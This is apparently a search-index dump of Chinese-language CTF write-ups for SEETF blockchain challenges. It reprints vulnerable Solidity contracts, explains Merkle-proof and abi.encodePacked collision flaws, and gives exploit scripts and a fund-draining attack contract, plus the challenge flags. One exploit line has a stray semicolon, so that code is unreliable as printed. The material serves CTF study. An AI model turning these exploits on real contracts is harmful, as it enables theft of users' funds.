0\uff0c\u56e0\u800c\u53ef\u4ee5\u4f20\u5165\u7a7a\u6570\u7ec4\u5e76\u5c06 _tokenId \uff0c\u5373 index \uff0c\u7684\u503c\u8bbe\u7f6e\u4e3a root 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function verify ( bytes32 [] calldata proof , bytes32 root , uint256 index ) internal pure returns ( bool ) { bytes32 computedHash = bytes32 ( abi . encodePacked ( index )); require ( root != bytes32 ( 0 ), \"MerkleProof: Root hash cannot be zero\" ); require ( computedHash != bytes32 ( 0 ), \"MerkleProof: Leaf hash cannot be zero\" ); for ( uint256 i = 0 ; i < proof . length ; i ++ ) { bytes32 proofElement = proof [ i ]; if ( computedHash < proofElement ) { // Hash(current computed hash + current element of the proof) computedHash = keccak256 ( abi . encodePacked ( computedHash , proofElement )); } else { // Hash(current element of the proof + current computed hash) computedHash = keccak256 ( abi . encodePacked ( proofElement , computedHash )); } } // Check if the computed hash (root) is equal to the provided root return computedHash == root ; } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import pwn from cheb3 import Connection from cheb3.utils import encode_with_signature , decode_data server = pwn . remote ( \"win.the.seetf.sg\" , 8546 ) server . sendlineafter ( b \"action?\" , b \"1\" ) uuid = server . recvline_contains ( b \"uuid\" ) . strip () . split ()[ - 1 ] conn = Connection ( server . recvline_contains ( b \"rpc\" ) . decode () . strip () . split ()[ - 1 ]) account = conn . account ( server . recvline_contains ( b \"private key\" ) . decode () . strip () . split ()[ - 1 ] ) setup_addr = server . recvline_contains ( b \"setup\" ) . decode () . strip () . split ()[ - 1 ] pass_addr = decode_data ( account . call ( setup_addr , encode_with_signature ( \"pass()\" )), [ \"address\" ] ) # get SEEPass instance address merkle_root = decode_data ( conn . get_storage_at ( pass_addr , 6 ), [ \"bytes32\" ] ) # get _merkleRoot account . send_transaction ( pass_addr , data = encode_with_signature ( \"mintSeePass(bytes32[],uint256)\" , [], int . from_bytes ( merkle_root , \"big\" ) ), ) # mint server = pwn . remote ( \"win.the.seetf.sg\" , 8546 ) server . sendlineafter ( b \"action?\" , b \"3\" ) server . sendlineafter ( b \"uuid please:\" , uuid ) server . interactive () Flag \u00b6 SEE{w3lc0me_t0_dA_NFT_w0rld_w1th_SE3pAs5_f3a794cf4f4dd14f9cc7f6a25f61e232}","title":"\ud83c\udf93 Murky SEEPass"},{"location":"blockchain/murky_seepass/#_1","text":"The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed! nc win.the.seetf.sg 8546 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"./SEEPass.sol\" ; contract Setup { SEEPass public immutable pass ; constructor ( bytes32 _merkleRoot ) { pass = new SEEPass ( _merkleRoot ); } function isSolved () external view returns ( bool ) { return pass . balanceOf ( msg . sender ) > 0 ; } } SEEPass.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"./MerkleProof.sol\" ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; contract SEEPass is ERC721 { bytes32 private _merkleRoot ; mapping ( uint256 => bool ) private _minted ; constructor ( bytes32 _root ) ERC721 ( \"SEE Pass\" , \"SEEP\" ) { _merkleRoot = _root ; } function mintSeePass ( bytes32 [] calldata _proof , uint256 _tokenId ) public { require ( ! hasMinted ( _tokenId ), \"Already minted\" ); require ( verify ( _proof , _merkleRoot , _tokenId ), \"Invalid proof\" ); _minted [ _tokenId ] = true ; _safeMint ( msg . sender , _tokenId ); } function verify ( bytes32 [] calldata proof , bytes32 root , uint256 index ) public pure returns ( bool ) { return MerkleProof . verify ( proof , root , index ); } function hasMinted ( uint256 _tokenId ) public view returns ( bool ) { return _minted [ _tokenId ]; } } MerkleProof.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; library MerkleProof { // Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted. function verify ( bytes32 [] calldata proof , bytes32 root , uint256 index ) internal pure returns ( bool ) { bytes32 computedHash = bytes32 ( abi . encodePacked ( index )); require ( root != bytes32 ( 0 ), \"MerkleProof: Root hash cannot be zero\" ); require ( computedHash != bytes32 ( 0 ), \"MerkleProof: Leaf hash cannot be zero\" ); for ( uint256 i = 0 ; i < proof . length ; i ++ ) { bytes32 proofElement = proof [ i ]; if ( computedHash < proofElement ) { // Hash(current computed hash + current element of the proof) computedHash = keccak256 ( abi . encodePacked ( computedHash , proofElement )); } else { // Hash(current element of the proof + current computed hash) computedHash = keccak256 ( abi . encodePacked ( proofElement , computedHash )); } } // Check if the computed hash (root) is equal to the provided root return computedHash == root ; } }","title":"\u9898\u76ee"},{"location":"blockchain/murky_seepass/#_2","text":"\u9700\u8981\u901a\u8fc7 mintSeePass() \u83b7\u5f97 NFT \u4f7f\u5f97\u653b\u51fb\u8005\u4f59\u989d\u5927\u4e8e 0 mintSeePass() \u9700\u8981\u63d0\u4f9b MerkleProof \u4ee5\u53ca\u5bf9\u5e94\u7684 _tokenId \uff0c\u800c verify() \u6ca1\u6709\u68c0\u67e5 proof \u6570\u7ec4\u7684\u957f\u5ea6\u662f\u5426\u4e3a 0\uff0c\u56e0\u800c\u53ef\u4ee5\u4f20\u5165\u7a7a\u6570\u7ec4\u5e76\u5c06 _tokenId \uff0c\u5373 index \uff0c\u7684\u503c\u8bbe\u7f6e\u4e3a root 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function verify ( bytes32 [] calldata proof , bytes32 root , uint256 index ) internal pure returns ( bool ) { bytes32 computedHash = bytes32 ( abi . encodePacked ( index )); require ( root != bytes32 ( 0 ), \"MerkleProof: Root hash cannot be zero\" ); require ( computedHash != bytes32 ( 0 ), \"MerkleProof: Leaf hash cannot be zero\" ); for ( uint256 i = 0 ; i < proof . length ; i ++ ) { bytes32 proofElement = proof [ i ]; if ( computedHash < proofElement ) { // Hash(current computed hash + current element of the proof) computedHash = keccak256 ( abi . encodePacked ( computedHash , proofElement )); } else { // Hash(current element of the proof + current computed hash) computedHash = keccak256 ( abi . encodePacked ( proofElement , computedHash )); } } // Check if the computed hash (root) is equal to the provided root return computedHash == root ; }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/murky_seepass/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import pwn from cheb3 import Connection from cheb3.utils import encode_with_signature , decode_data server = pwn . remote ( \"win.the.seetf.sg\" , 8546 ) server . sendlineafter ( b \"action?\" , b \"1\" ) uuid = server . recvline_contains ( b \"uuid\" ) . strip () . split ()[ - 1 ] conn = Connection ( server . recvline_contains ( b \"rpc\" ) . decode () . strip () . split ()[ - 1 ]) account = conn . account ( server . recvline_contains ( b \"private key\" ) . decode () . strip () . split ()[ - 1 ] ) setup_addr = server . recvline_contains ( b \"setup\" ) . decode () . strip () . split ()[ - 1 ] pass_addr = decode_data ( account . call ( setup_addr , encode_with_signature ( \"pass()\" )), [ \"address\" ] ) # get SEEPass instance address merkle_root = decode_data ( conn . get_storage_at ( pass_addr , 6 ), [ \"bytes32\" ] ) # get _merkleRoot account . send_transaction ( pass_addr , data = encode_with_signature ( \"mintSeePass(bytes32[],uint256)\" , [], int . from_bytes ( merkle_root , \"big\" ) ), ) # mint server = pwn . remote ( \"win.the.seetf.sg\" , 8546 ) server . sendlineafter ( b \"action?\" , b \"3\" ) server . sendlineafter ( b \"uuid please:\" , uuid ) server . interactive ()","title":"Exploit"},{"location":"blockchain/murky_seepass/#flag","text":"SEE{w3lc0me_t0_dA_NFT_w0rld_w1th_SE3pAs5_f3a794cf4f4dd14f9cc7f6a25f61e232}","title":"Flag"},{"location":"blockchain/operation_feathered_fortune_fiasco/","tags":["smart contract","abi.encodePacked","collisions"],"text":"#smart contract #abi.encodePacked #collisions .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings. Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous. The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn't free. They must return the earned ETH back to their master for their promotion. Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they've earned. Will they remain loyal, or will they break free? nc win.the.seetf.sg 8548 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.17 ; import \"./Pigeon.sol\" ; contract Setup { Pigeon public immutable pigeon ; constructor () payable { pigeon = new Pigeon (); // Junior Pigeons pigeon . assignPigeon ( \"Numbuh\" , \"6\" , address ( 0x006 ), 0 ); pigeon . assignPigeon { value : 5e18 }( \"Numbuh\" , \"5\" , address ( 0x005 ), 0 ); pigeon . assignPigeon ( \"Numbuh\" , \"4\" , address ( 0x004 ), 1 ); pigeon . assignPigeon { value : 10e18 }( \"Numbuh\" , \"3\" , address ( 0x003 ), 1 ); pigeon . assignPigeon ( \"Numbuh\" , \"2\" , address ( 0x002 ), 2 ); pigeon . assignPigeon { value : 15e18 }( \"Numbuh\" , \"1\" , address ( 0x001 ), 2 ); } receive () external payable {} function isSolved () external view returns ( bool ) { return address ( msg . sender ). balance >= 34 ether && address ( pigeon ). balance == 0 ether ; } } Pigeon.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.17 ; contract Pigeon { address private owner ; uint256 private ownerBalance ; uint256 private juniorPromotion ; uint256 private associatePromotion ; mapping ( bytes32 => address ) private seniorPigeon ; mapping ( bytes32 => address ) private associatePigeon ; mapping ( bytes32 => address ) private juniorPigeon ; mapping ( address => bool ) private isPigeon ; mapping ( string => mapping ( string => bool )) private codeToName ; mapping ( bytes32 => uint256 ) private taskPoints ; mapping ( address => mapping ( address => uint256 )) private dataCollection ; mapping ( address => bool ) private hasBeenCollected ; mapping ( bytes32 => uint256 ) private treasury ; modifier onlyOwner () { if ( owner != msg . sender ) revert (); _ ; } modifier oneOfUs () { if ( ! isPigeon [ msg . sender ]) revert (); _ ; } constructor () { owner = msg . sender ; juniorPromotion = 8e18 ; associatePromotion = 12e18 ; } function becomeAPigeon ( string memory code , string memory name ) public returns ( bytes32 codeName ) { codeName = keccak256 ( abi . encodePacked ( code , name )); if ( codeToName [ code ][ name ]) revert (); if ( isPigeon [ msg . sender ]) revert (); juniorPigeon [ codeName ] = msg . sender ; isPigeon [ msg . sender ] = true ; codeToName [ code ][ name ] = true ; return codeName ; } function task ( bytes32 codeName , address person , uint256 data ) public oneOfUs { if ( person == address ( 0 )) revert (); if ( isPigeon [ person ]) revert (); if ( address ( person ). balance != data ) revert (); uint256 points = data ; hasBeenCollected [ person ] = true ; dataCollection [ msg . sender ][ person ] = points ; taskPoints [ codeName ] += points ; } function flyAway ( bytes32 codeName , uint256 rank ) public oneOfUs { uint256 bag = treasury [ codeName ]; treasury [ codeName ] = 0 ; if ( rank == 0 ) { if ( taskPoints [ codeName ] > juniorPromotion ) revert (); ( bool success ,) = juniorPigeon [ codeName ]. call { value : bag }( \"\" ); require ( success , \"Transfer failed.\" ); } if ( rank == 1 ) { if ( taskPoints [ codeName ] > associatePromotion ) revert (); ( bool success ,) = associatePigeon [ codeName ]. call { value : bag }( \"\" ); require ( success , \"Transfer failed.\" ); } if ( rank == 2 ) { ( bool success ,) = seniorPigeon [ codeName ]. call { value : bag }( \"\" ); require ( success , \"Transfer failed.\" ); } } function promotion ( bytes32 codeName , uint256 desiredRank , string memory newCode , string memory newName ) public oneOfUs { if ( desiredRank == 1 ) { if ( msg . sender != juniorPigeon [ codeName ]) revert (); if ( taskPoints [ codeName ] < juniorPromotion ) revert (); ownerBalance += treasury [ codeName ]; bytes32 newCodeName = keccak256 ( abi . encodePacked ( newCode , newName )); if ( codeToName [ newCode ][ newName ]) revert (); associatePigeon [ newCodeName ] = msg . sender ; codeToName [ newCode ][ newName ] = true ; taskPoints [ codeName ] = 0 ; delete juniorPigeon [ codeName ]; ( bool success ,) = owner . call { value : treasury [ codeName ]}( \"\" ); require ( success , \"Transfer failed.\" ); } if ( desiredRank == 2 ) { if ( msg . sender != associatePigeon [ codeName ]) revert (); if ( taskPoints [ codeName ] < associatePromotion ) revert (); ownerBalance += treasury [ codeName ]; bytes32 newCodeName = keccak256 ( abi . encodePacked ( newCode , newName )); if ( codeToName [ newCode ][ newName ]) revert (); seniorPigeon [ newCodeName ] = msg . sender ; codeToName [ newCode ][ newName ] = true ; taskPoints [ codeName ] = 0 ; delete seniorPigeon [ codeName ]; ( bool success ,) = owner . call { value : treasury [ codeName ]}( \"\" ); require ( success , \"Transfer failed.\" ); } } function assignPigeon ( string memory code , string memory name , address pigeon , uint256 rank ) external payable onlyOwner { bytes32 codeName = keccak256 ( abi . encodePacked ( code , name )); if ( rank == 0 ) { juniorPigeon [ codeName ] = pigeon ; treasury [ codeName ] = msg . value ; juniorPigeon [ codeName ] = pigeon ; isPigeon [ pigeon ] = true ; codeToName [ code ][ name ] = true ; } if ( rank == 1 ) { associatePigeon [ codeName ] = pigeon ; treasury [ codeName ] = msg . value ; associatePigeon [ codeName ] = pigeon ; isPigeon [ pigeon ] = true ; codeToName [ code ][ name ] = true ; } if ( rank == 2 ) { seniorPigeon [ codeName ] = pigeon ; treasury [ codeName ] = msg . value ; seniorPigeon [ codeName ] = pigeon ; isPigeon [ pigeon ] = true ; codeToName [ code ][ name ] = true ; } } function exit () public onlyOwner { ( bool success ,) = owner . call { value : ownerBalance }( \"\" ); require ( success , \"Transfer failed.\" ); } } \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u6e05\u7a7a Pigeon \u7684\u4f59\u989d\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u6301\u6709\u4e0d\u5c11\u4e8e 34 ether\uff08\u521d\u59cb\u4e3a 5 ether\uff09 Pigeon.flyAway() \u53ef\u4ee5\u83b7\u5f97 treasury[codeName] \u6570\u91cf\u7684 ether \u6f0f\u6d1e\u70b9\u5728\u4e8e code \u548c name \u5747\u4e3a\u52a8\u6001\u7c7b\u578b string \uff0c\u56e0\u6b64\u6709 abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\") \uff0c\u540c\u65f6 codeName = keccak256(abi.encodePacked(code, name)) \uff0c\u4ece\u800c\u53ef\u4ee5\u5192\u9886\u5176\u5b83 Pigeon \u7684 treasury \u53ef\u4ee5\u5148\u8c03\u7528 Pigeon.becomeAPigeon() \uff0c flyAway() \u83b7\u5f97 5 ether \u968f\u540e\uff0c\u8c03\u7528 Pigeon.task() \u589e\u52a0 taskPoints \u4ee5\u901a\u8fc7 Pigeon.promotion() \u664b\u7ea7\uff0c\u4ece\u800c\u80fd\u5192\u9886\u4e0b\u4e00\u7b49\u7ea7 Pigeon \u7684 treasury task() \u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u4e0d\u662f Pigeon \u7684\u5730\u5740\uff0c taskPoints \u589e\u52a0\u7684\u503c\u53d6\u51b3\u4e8e\u6307\u5b9a\u5730\u5740\u7684\u4f59\u989d\u3002\u5c3d\u7ba1\u6709 hasBeenCollected \u7684\u8bb0\u5f55\uff0c\u4f46\u5e76\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u68c0\u67e5\uff0c\u56e0\u6b64\u4f7f\u7528 Pigeon \u5b9e\u4f8b\u7684\u5730\u5740\u5373\u53ef Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 pragma solidity 0.8.17 ; interface IPigeon { function becomeAPigeon ( string memory , string memory ) external returns ( bytes32 ); function task ( bytes32 , address , uint256 ) external ; function promotion ( bytes32 , uint256 , string memory , string memory ) external ; function flyAway ( bytes32 , uint256 ) external ; } contract Hack { function exploit ( address instance ) external { IPigeon pigeon = IPigeon ( instance ); bytes32 codeName = keccak256 ( abi . encodePacked ( \"Numbuh5\" )); pigeon . becomeAPigeon ( \"Numbu\" , \"h5\" ); pigeon . flyAway ( codeName , 0 ); pigeon . task ( codeName , instance , instance . balance ); pigeon . promotion ( codeName , 1 , \"Numbu\" , \"h3\" ); codeName = keccak256 ( abi . encodePacked ( \"Numbuh3\" )); pigeon . flyAway ( codeName , 1 ); pigeon . task ( codeName , instance , instance . balance ); pigeon . promotion ( codeName , 2 , \"Numbu\" , \"h1\" ); pigeon . flyAway ( keccak256 ( abi . encodePacked ( \"Numbuh1\" ));, 2 ); selfdestruct ( payable ( msg . sender )); } receive () external payable {} } Flag \u00b6 SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}","title":"Operation Feathered Fortune Fiasco"},{"location":"blockchain/operation_feathered_fortune_fiasco/#_1","text":"In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings. Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous. The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn't free. They must return the earned ETH back to their master for their promotion. Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they've earned. Will they remain loyal, or will they break free? nc win.the.seetf.sg 8548 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.17 ; import \"./Pigeon.sol\" ; contract Setup { Pigeon public immutable pigeon ; constructor () payable { pigeon = new Pigeon (); // Junior Pigeons pigeon . assignPigeon ( \"Numbuh\" , \"6\" , address ( 0x006 ), 0 ); pigeon . assignPigeon { value : 5e18 }( \"Numbuh\" , \"5\" , address ( 0x005 ), 0 ); pigeon . assignPigeon ( \"Numbuh\" , \"4\" , address ( 0x004 ), 1 ); pigeon . assignPigeon { value : 10e18 }( \"Numbuh\" , \"3\" , address ( 0x003 ), 1 ); pigeon . assignPigeon ( \"Numbuh\" , \"2\" , address ( 0x002 ), 2 ); pigeon . assignPigeon { value : 15e18 }( \"Numbuh\" , \"1\" , address ( 0x001 ), 2 ); } receive () external payable {} function isSolved () external view returns ( bool ) { return address ( msg . sender ). balance >= 34 ether && address ( pigeon ). balance == 0 ether ; } } Pigeon.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.17 ; contract Pigeon { address private owner ; uint256 private ownerBalance ; uint256 private juniorPromotion ; uint256 private associatePromotion ; mapping ( bytes32 => address ) private seniorPigeon ; mapping ( bytes32 => address ) private associatePigeon ; mapping ( bytes32 => address ) private juniorPigeon ; mapping ( address => bool ) private isPigeon ; mapping ( string => mapping ( string => bool )) private codeToName ; mapping ( bytes32 => uint256 ) private taskPoints ; mapping ( address => mapping ( address => uint256 )) private dataCollection ; mapping ( address => bool ) private hasBeenCollected ; mapping ( bytes32 => uint256 ) private treasury ; modifier onlyOwner () { if ( owner != msg . sender ) revert (); _ ; } modifier oneOfUs () { if ( ! isPigeon [ msg . sender ]) revert (); _ ; } constructor () { owner = msg . sender ; juniorPromotion = 8e18 ; associatePromotion = 12e18 ; } function becomeAPigeon ( string memory code , string memory name ) public returns ( bytes32 codeName ) { codeName = keccak256 ( abi . encodePacked ( code , name )); if ( codeToName [ code ][ name ]) revert (); if ( isPigeon [ msg . sender ]) revert (); juniorPigeon [ codeName ] = msg . sender ; isPigeon [ msg . sender ] = true ; codeToName [ code ][ name ] = true ; return codeName ; } function task ( bytes32 codeName , address person , uint256 data ) public oneOfUs { if ( person == address ( 0 )) revert (); if ( isPigeon [ person ]) revert (); if ( address ( person ). balance != data ) revert (); uint256 points = data ; hasBeenCollected [ person ] = true ; dataCollection [ msg . sender ][ person ] = points ; taskPoints [ codeName ] += points ; } function flyAway ( bytes32 codeName , uint256 rank ) public oneOfUs { uint256 bag = treasury [ codeName ]; treasury [ codeName ] = 0 ; if ( rank == 0 ) { if ( taskPoints [ codeName ] > juniorPromotion ) revert (); ( bool success ,) = juniorPigeon [ codeName ]. call { value : bag }( \"\" ); require ( success , \"Transfer failed.\" ); } if ( rank == 1 ) { if ( taskPoints [ codeName ] > associatePromotion ) revert (); ( bool success ,) = associatePigeon [ codeName ]. call { value : bag }( \"\" ); require ( success , \"Transfer failed.\" ); } if ( rank == 2 ) { ( bool success ,) = seniorPigeon [ codeName ]. call { value : bag }( \"\" ); require ( success , \"Transfer failed.\" ); } } function promotion ( bytes32 codeName , uint256 desiredRank , string memory newCode , string memory newName ) public oneOfUs { if ( desiredRank == 1 ) { if ( msg . sender != juniorPigeon [ codeName ]) revert (); if ( taskPoints [ codeName ] < juniorPromotion ) revert (); ownerBalance += treasury [ codeName ]; bytes32 newCodeName = keccak256 ( abi . encodePacked ( newCode , newName )); if ( codeToName [ newCode ][ newName ]) revert (); associatePigeon [ newCodeName ] = msg . sender ; codeToName [ newCode ][ newName ] = true ; taskPoints [ codeName ] = 0 ; delete juniorPigeon [ codeName ]; ( bool success ,) = owner . call { value : treasury [ codeName ]}( \"\" ); require ( success , \"Transfer failed.\" ); } if ( desiredRank == 2 ) { if ( msg . sender != associatePigeon [ codeName ]) revert (); if ( taskPoints [ codeName ] < associatePromotion ) revert (); ownerBalance += treasury [ codeName ]; bytes32 newCodeName = keccak256 ( abi . encodePacked ( newCode , newName )); if ( codeToName [ newCode ][ newName ]) revert (); seniorPigeon [ newCodeName ] = msg . sender ; codeToName [ newCode ][ newName ] = true ; taskPoints [ codeName ] = 0 ; delete seniorPigeon [ codeName ]; ( bool success ,) = owner . call { value : treasury [ codeName ]}( \"\" ); require ( success , \"Transfer failed.\" ); } } function assignPigeon ( string memory code , string memory name , address pigeon , uint256 rank ) external payable onlyOwner { bytes32 codeName = keccak256 ( abi . encodePacked ( code , name )); if ( rank == 0 ) { juniorPigeon [ codeName ] = pigeon ; treasury [ codeName ] = msg . value ; juniorPigeon [ codeName ] = pigeon ; isPigeon [ pigeon ] = true ; codeToName [ code ][ name ] = true ; } if ( rank == 1 ) { associatePigeon [ codeName ] = pigeon ; treasury [ codeName ] = msg . value ; associatePigeon [ codeName ] = pigeon ; isPigeon [ pigeon ] = true ; codeToName [ code ][ name ] = true ; } if ( rank == 2 ) { seniorPigeon [ codeName ] = pigeon ; treasury [ codeName ] = msg . value ; seniorPigeon [ codeName ] = pigeon ; isPigeon [ pigeon ] = true ; codeToName [ code ][ name ] = true ; } } function exit () public onlyOwner { ( bool success ,) = owner . call { value : ownerBalance }( \"\" ); require ( success , \"Transfer failed.\" ); } }","title":"\u9898\u76ee"},{"location":"blockchain/operation_feathered_fortune_fiasco/#_2","text":"\u76ee\u6807\u662f\u6e05\u7a7a Pigeon \u7684\u4f59\u989d\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u6301\u6709\u4e0d\u5c11\u4e8e 34 ether\uff08\u521d\u59cb\u4e3a 5 ether\uff09 Pigeon.flyAway() \u53ef\u4ee5\u83b7\u5f97 treasury[codeName] \u6570\u91cf\u7684 ether \u6f0f\u6d1e\u70b9\u5728\u4e8e code \u548c name \u5747\u4e3a\u52a8\u6001\u7c7b\u578b string \uff0c\u56e0\u6b64\u6709 abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\") \uff0c\u540c\u65f6 codeName = keccak256(abi.encodePacked(code, name)) \uff0c\u4ece\u800c\u53ef\u4ee5\u5192\u9886\u5176\u5b83 Pigeon \u7684 treasury \u53ef\u4ee5\u5148\u8c03\u7528 Pigeon.becomeAPigeon() \uff0c flyAway() \u83b7\u5f97 5 ether \u968f\u540e\uff0c\u8c03\u7528 Pigeon.task() \u589e\u52a0 taskPoints \u4ee5\u901a\u8fc7 Pigeon.promotion() \u664b\u7ea7\uff0c\u4ece\u800c\u80fd\u5192\u9886\u4e0b\u4e00\u7b49\u7ea7 Pigeon \u7684 treasury task() \u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u4e0d\u662f Pigeon \u7684\u5730\u5740\uff0c taskPoints \u589e\u52a0\u7684\u503c\u53d6\u51b3\u4e8e\u6307\u5b9a\u5730\u5740\u7684\u4f59\u989d\u3002\u5c3d\u7ba1\u6709 hasBeenCollected \u7684\u8bb0\u5f55\uff0c\u4f46\u5e76\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u68c0\u67e5\uff0c\u56e0\u6b64\u4f7f\u7528 Pigeon \u5b9e\u4f8b\u7684\u5730\u5740\u5373\u53ef","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/operation_feathered_fortune_fiasco/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 pragma solidity 0.8.17 ; interface IPigeon { function becomeAPigeon ( string memory , string memory ) external returns ( bytes32 ); function task ( bytes32 , address , uint256 ) external ; function promotion ( bytes32 , uint256 , string memory , string memory ) external ; function flyAway ( bytes32 , uint256 ) external ; } contract Hack { function exploit ( address instance ) external { IPigeon pigeon = IPigeon ( instance ); bytes32 codeName = keccak256 ( abi . encodePacked ( \"Numbuh5\" )); pigeon . becomeAPigeon ( \"Numbu\" , \"h5\" ); pigeon . flyAway ( codeName , 0 ); pigeon . task ( codeName , instance , instance . balance ); pigeon . promotion ( codeName , 1 , \"Numbu\" , \"h3\" ); codeName = keccak256 ( abi . encodePacked ( \"Numbuh3\" )); pigeon . flyAway ( codeName , 1 ); pigeon . task ( codeName , instance , instance . balance ); pigeon . promotion ( codeName , 2 , \"Numbu\" , \"h1\" ); pigeon . flyAway ( keccak256 ( abi . encodePacked ( \"Numbuh1\" ));, 2 ); selfdestruct ( payable ( msg . sender )); } receive () external payable {} }","title":"Exploit"},{"location":"blockchain/operation_feathered_fortune_fiasco/#flag","text":"SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}","title":"Flag"},{"location":"blockchain/pigeon_bank/","tags":["smart contract","cross-function reentrancy"],"text":"#smart contract #cross-function reentrancy .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption. nc win.the.seetf.sg 8550 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"./PETH.sol\" ; import \"./PigeonBank.sol\" ; contract Setup { PETH public immutable peth ; PigeonBank public immutable pigeonBank ; // @dev - The SEE Team provided 2500 ETH to PigeonBank to provide liquidity so that the bank stays solvent. constructor () payable { require ( msg . value == 2500 ether , \"Setup: msg.value must be 2500 ether\" ); pigeonBank = new PigeonBank (); peth = pigeonBank . peth 